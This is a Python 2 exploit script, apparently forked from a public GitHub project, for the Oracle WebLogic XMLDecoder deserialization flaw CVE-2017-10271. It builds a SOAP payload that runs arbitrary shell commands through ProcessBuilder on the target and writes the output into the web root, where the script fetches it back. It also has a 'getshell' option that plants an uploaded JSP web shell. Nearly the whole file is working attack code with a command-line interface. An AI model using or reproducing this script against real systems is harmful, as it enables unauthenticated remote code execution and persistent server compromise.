#!/usr/bin/env python
#coding:utf-8
import requests
import argparse
import time
import base64
'''
forked from https://github.com/s3xy/CVE-2017-10271
Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS Security). 
Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. 
Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server
Modified by hanc00l
'''
proxies = {'http':'http://127.0.0.1:8080'}
headers = {'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
timeout = 5
'''
payload的格式化
'''
def payload_command(command_in,output_file):
    html_escape_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    #命令执行回显：将命令执行的结果输出到文件中
    command_in_payload = 'find . -name index.html| while read path_file;do {} >$(dirname $path_file)/{};done'.format(command_in,output_file)
    command_filtered = "<string>"+"".join(html_escape_table.get(c, c) for c in command_in_payload)+"</string>"
    #XMLDecoder反序列化payload:

    payload_1 = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> \n" \
                "   <soapenv:Header> " \
                "       <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> \n" \
                "           <java version=\"1.8.0_151\" class=\"java.beans.XMLDecoder\"> \n" \
                "               <void class=\"java.lang.ProcessBuilder\"> \n" \
                "                  <array class=\"java.lang.String\" length=\"3\">" \
                "                      <void index = \"0\">                       " \
                "                          <string>/bin/sh</string>                 " \
                "                      </void>                                    " \
                "                      <void index = \"1\">                       " \
                "                          <string>-c</string>                  " \
                "                      </void>                                    " \
                "                      <void index = \"2\">                       " \
                + command_filtered + \
                "                      </void>                                    " \
                "                  </array>" \
                "                  <void method=\"start\"/>" \
                "                  </void>" \
                "            </java>" \
                "        </work:WorkContext>" \
                "   </soapenv:Header>" \
                "   <soapenv:Body/>" \
                "</soapenv:Envelope>"
    return payload_1

'''
得到命令执行的回显结果
'''
def get_output(target,output_file):
    #url增加时间戳避免数据是上一次的结果缓存
    output_url = 'http://{}/bea_wls_internal/{}?{}'.format(target,output_file,int(time.time()))
    try:
        r = requests.get(output_url,headers = headers,proxies=proxies,timeout=timeout)
        if r.status_code == requests.codes.ok:
            return (True,r.text.strip())
        else:
            return (False,r.status_code)
    except Exception,ex:
        #raise
        return (False,str(ex))

'''
RCE
'''
def weblogic_rce(target,cmd,output_file):
    url = 'http://{}/wls-wsat/CoordinatorPortType'.format(target)
    #content-type必须为text/xml
    payload_header = {'content-type': 'text/xml','User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
    msg = ''
    try:
        r = requests.post(url, payload_command(cmd,output_file),headers = payload_header,verify=False,timeout=timeout,proxies=proxies)
        #500时说明已成功反序列化执行命令
        if r.status_code == 500:
            #delay一下，保证命令执行完整性：
            time.sleep(1)
            return get_output(target,output_file)
        else:
            return (False,'{},Something Went Wrong'.format(r.status_code))
    except requests.exceptions.ReadTimeout:
        return (False,'timeout')
    except Exception,ex:
        #raise
        return (False,str(ex))

'''
getshell
'''
def weblogic_getshell(target,output_file,shell_file):
    with open(shell_file) as f:
        cmd = 'echo {}|base64 -d'.format(base64.b64encode(f.read()))
        status,result = weblogic_rce(target,cmd,output_file)
        if status:
            print '[+]shell-> http://{}/bea_wls_internal/{}'.format(target,output_file)
        return (status,result)

'''
main
'''
def main():
    parse = argparse.ArgumentParser()
    parse.add_argument('-t', '--target',required=True, help='weblogic ip and port(eg -> 172.16.80.131:7001)')
    parse.add_argument('-c', '--cmd', required=False,default='id', help='cmd to execute,default is id')
    parse.add_argument('-o', '--output', required=False,default='output.txt', help='output file name,default is output.txt')
    parse.add_argument('-s', '--shell', required = False,default='',help='getshell by upload jsp file')
    args = parse.parse_args()
    
    if args.shell!='':
        status,result = weblogic_getshell(args.target,args.output,args.shell)
    else:
        status,result = weblogic_rce(args.target,args.cmd,args.output)
    #output result:
    if status:
        print result
    else:
        print '[-]FAIL:{}'.format(result)

if __name__ == '__main__':
    main()
